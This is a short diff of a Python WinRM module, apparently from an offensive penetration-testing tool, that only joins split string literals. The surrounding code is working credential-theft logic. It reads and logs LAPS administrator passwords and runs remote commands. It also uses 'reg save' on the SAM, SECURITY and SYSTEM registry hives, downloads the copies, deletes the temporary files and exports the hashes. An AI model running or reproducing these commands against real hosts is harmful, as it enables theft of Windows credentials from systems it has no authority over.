@@ -153,7 +153,7 @@ class winrm(connection):
                 elif "ms-mcs-admpwd" in values:
                     msMCSAdmPwd = str(values["ms-mcs-admpwd"])
                 else:
-                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or" " msLAPS-Password")
+                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password")
             self.logger.debug(f"Host: {sAMAccountName:<20} Password: {msMCSAdmPwd} {self.hostname}")
         else:
             self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")
@@ -313,7 +313,7 @@ class winrm(connection):
         try:
             r = self.conn.execute_cmd(self.args.execute, encoding=self.args.codec)
         except Exception:
-            self.logger.info("Cannot execute command, probably because user is not local admin, but" " powershell command should be ok!")
+            self.logger.info("Cannot execute command, probably because user is not local admin, but powershell command should be ok!")
             r = self.conn.execute_ps(self.args.execute)
         self.logger.success("Executed command")
         buf = StringIO(r[0]).readlines()
@@ -328,7 +328,7 @@ class winrm(connection):
             self.logger.highlight(line.strip())
 
     def sam(self):
-        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM" " C:\\windows\\temp\\SYSTEM")
+        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
         self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
         self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
         self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")
@@ -345,7 +345,7 @@ class winrm(connection):
         SAM.export(f"{self.output_filename}.sam")
 
     def lsa(self):
-        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM" " C:\\windows\\temp\\SYSTEM")
+        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
         self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
         self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
         self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")
